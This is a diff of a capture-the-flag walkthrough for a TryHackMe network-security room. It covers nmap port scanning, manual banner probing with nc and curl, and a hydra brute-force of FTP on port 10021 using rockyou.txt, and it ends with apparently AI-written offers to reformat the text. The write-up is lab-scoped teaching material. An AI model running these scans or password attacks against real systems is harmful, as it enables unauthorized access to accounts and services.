@@ -2,8 +2,9 @@
 
 *Guided walkthrough & learning notes*
 
-> **Difficulty:** Medium (part of the Network Security module)
+> **Difficulty:** Medium (part of the Network Security module)  
 > **Tools used:** `nmap`, `telnet` / `nc` / `curl`, `hydra` (and general Linux CLI)
+
 ---
 
 ## Table of contents
@@ -16,11 +17,13 @@
 6. [Step 4 — Password attack with Hydra](#step-4---password-attack-with-hydra)
 7. [Step 5 — Final checks & answers](#step-5---final-checks--answers)
 8. [Learning notes & tips](#learning-notes--tips)
+9. [Further reading & resources](#further-reading--resources)
+
 ---
 
 ## Overview
 
-This write-up walks you through the methodology to solve **Net Sec Challenge**: perform full port discovery, inspect HTTP headers/content for clues, connect manually to unusual services, and perform a controlled brute-force where allowed (FTP in-scope) to obtain the remaining answers. The community solutions confirm the expected workflow: `nmap` → manual probes (`telnet`/`curl`) → `hydra`. ([Medium][2])
+This write-up walks you through the methodology to solve **Net Sec Challenge**: perform full port discovery, inspect HTTP headers/content for clues, connect manually to unusual services, and perform a controlled brute-force where allowed (FTP in-scope) to obtain the remaining answers. The suggested workflow is: `nmap` → manual probes (`telnet`/`curl`) → `hydra`.
 
 ---
 
@@ -44,23 +47,19 @@ Start with a wide scan to discover open ports. The room expects you to check bot
 
 **Command — scan first 10,000 ports (fast):**
 
-```bash
 sudo nmap -sS -sV -p1-10000 -T4 -vv <TARGET_IP>
-```
 
 **Why:** `-sS` (SYN scan) for stealth/speed, `-sV` for service/version, `-p1-10000` restricts to ports <10,000 for the first question; `-T4 -vv` speeds up and shows verbose output.
 
-**If you need to find ports outside 1–10000** (the walkthroughs note an open port >10000), scan all ports:
+**If you need to find ports outside 1–10000**, scan all ports:
 
-```bash
 sudo nmap -sS -sV -p- -T4 -vv <TARGET_IP>
-```
 
 **What to look for:**
 
 * Highest open port below 10,000 (answerable from the first scan).
 * Any open port above 10,000 (revealed by `-p-`).
-* How many TCP ports are open total (count from results). ([Medium][2])
+* How many TCP ports are open total (count from results).
 
 ---
 
@@ -70,36 +69,30 @@ One common result in community writeups is an HTTP service on port **8080**. Use
 
 **HTTP header scan with Nmap:**
 
-```bash
 sudo nmap -p 8080 --script http-headers -sV <TARGET_IP>
-```
 
 **Or use curl to see headers and content:**
 
-```bash
 curl -I http://<TARGET_IP>:8080/
 curl http://<TARGET_IP>:8080/ -L
-```
 
-**Why:** Some rooms hide flags/clues in server headers or in the returned webpage content (for example a custom `Server:` header or hidden comment). Use `curl -I` to fetch headers and `curl` or a browser to view page body. ([Medium][2])
+**Why:** Some rooms hide flags/clues in server headers or in the returned webpage content (for example a custom `Server:` header or hidden comment). Use `curl -I` to fetch headers and `curl` or a browser to view page body.
 
 ---
 
 ## Step 3 — Non-standard FTP on 10021
 
-Community writeups report an FTP server listening on **port 10021** (not standard 21). Manually connect to see banners and possibly usernames.
+Community writeups often report an FTP server listening on **port 10021** (not standard 21). Manually connect to see banners and possibly usernames.
 
 **Connect with ftp client or netcat:**
 
-```bash
 ftp <TARGET_IP> 10021
 # OR
 nc <TARGET_IP> 10021
 # OR use curl (for banner):
 curl telnet://<TARGET_IP>:10021
-```
 
-**Why:** Non-standard services are common in CTFs. Banner/version (`vsftpd 3.0.5` or similar) may be shown and indicate which service to target for auth attempts. ([GitHub][3])
+**Why:** Non-standard services are common in CTFs. Banner/version (e.g., `vsftpd 3.0.5`) may be shown and indicate which service to target for auth attempts.
 
 ---
 
@@ -111,23 +104,17 @@ If the FTP service is in scope for password guessing (the lab allows it), gather
 
 1. Create `users.txt` containing target usernames (one per line). For example:
 
-```
 alice
 bob
-```
 
-2. Use `rockyou.txt` or another suitable list (be mindful of lab rules):
+2. Use a sensible password list (e.g., `rockyou.txt`) — be mindful of lab rules:
 
-```bash
 # Confirm the location of rockyou (Kali)
 ls /usr/share/wordlists/rockyou.txt
-```
 
 3. Run hydra against FTP on the non-standard port:
 
-```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://<TARGET_IP> -t 4 -V
-```
 
 **Flags explained:**
 
@@ -138,7 +125,7 @@ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://<TARGET_IP
 * `-t 4` — 4 parallel tasks (adjust for reliability)
 * `-V` — verbose
 
-**Note:** Only perform password attacks inside the TryHackMe lab (authorized). Community writeups show `hydra` finds credentials for one of the accounts. ([DEV Community][4])
+**Note:** Only perform password attacks inside the TryHackMe lab (authorized).
 
 ---
 
@@ -154,32 +141,30 @@ After the steps above you will have what you need to answer the room questions:
 
 > **Example commands summary**
 
-```bash
-# Full port scan + service/version + default scripts
-sudo nmap -sS -sV -sC -p- -T4 -vv <TARGET_IP>
-
-# Focused scan for first 10000 ports
-sudo nmap -sS -sV -p1-10000 -T4 -vv <TARGET_IP>
-
-# HTTP header inspection
-sudo nmap -p 8080 --script http-headers -sV <TARGET_IP>
-curl -I http://<TARGET_IP>:8080/
-
-# Connect to FTP on non-standard port
-ftp <TARGET_IP> 10021
-# or
-nc <TARGET_IP> 10021
-
-# Hydra brute-force for FTP (example)
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://<TARGET_IP> -t 4 -V
-```
+> # Full port scan + service/version + default scripts
+> sudo nmap -sS -sV -sC -p- -T4 -vv <TARGET_IP>
+>
+> # Focused scan for first 10000 ports
+> sudo nmap -sS -sV -p1-10000 -T4 -vv <TARGET_IP>
+>
+> # HTTP header inspection
+> sudo nmap -p 8080 --script http-headers -sV <TARGET_IP>
+> curl -I http://<TARGET_IP>:8080/
+>
+> # Connect to FTP on non-standard port
+> ftp <TARGET_IP> 10021
+> # or
+> nc <TARGET_IP> 10021
+>
+> # Hydra brute-force for FTP (example)
+> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://<TARGET_IP> -t 4 -V
 
 ---
 
 ## Learning notes & tips
 
-* **Start broad, then focus.** Full port scans (`-p-`) take longer but find nonstandard services; filtered runs (`-p1-10000`) answer specific questions quickly. ([ITTavern][5])
-* **Manual probing matters.** `telnet`/`nc`/`curl` show raw server behavior that automated tools may not highlight. This is invaluable for spotting flags or hidden endpoints. ([InfoSec Write-ups][1])
+* **Start broad, then focus.** Full port scans (`-p-`) take longer but find nonstandard services; filtered runs (`-p1-10000`) answer specific questions quickly.
+* **Manual probing matters.** `telnet`/`nc`/`curl` show raw server behavior that automated tools may not highlight.
 * **Respect lab scope.** Only use aggressive password attacks (Hydra) inside authorized lab environments. Start with small `-t` parallelism and sane wordlists.
 * **Record everything.** Save Nmap output (`-oN scan.txt`) and any interesting banners/pages — they’re useful for later reporting and learning.
 
@@ -187,14 +172,18 @@ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://<TARGET_IP
 
 ## Further reading & resources
 
-* TryHackMe — **Network Security** module description (module page). ([TryHackMe][6])
-* Community walkthroughs:
-
-  * Simple writeup / summary (Infosec Writeups). ([InfoSec Write-ups][1])
-  * Medium walkthrough (Aircon). ([Medium][2])
-  * GitHub repository with short writeup and commands. ([GitHub][3])
-* Nmap practical guide: [https://nmap.org/book/](https://nmap.org/book/) (read the Nmap documentation for advanced flags).
-* Hydra usage examples: `man hydra` and Kali docs.
-* Practice resources: TryHackMe labs & HTB for more scenario-based learning. ([TryHackMe][7])
+* TryHackMe — **Network Security** (search results): https://tryhackme.com/search?q=network%20security
+* Nmap book & documentation: https://nmap.org/book/
+* InfoSec writeups (examples & community): https://infosecwriteups.com/
+* Medium (security/topic examples): https://medium.com/tag/security
+* GitHub search (example writeups): https://github.com/search?q=net+sec+challenge
+* DEV Community (security posts): https://dev.to/t/security
 
 ---
+
+## Final notes
+
+This write-up is prescriptive: follow the steps in order, replace `<TARGET_IP>` with the machine IP from the TryHackMe room, and capture outputs for each step as evidence. If you want, I can:
+* Condense this into a one-page cheat-sheet,
+* Turn it into a short LinkedIn thread, or
+* Add screenshots and example command outputs to make it more tutorial-esque.
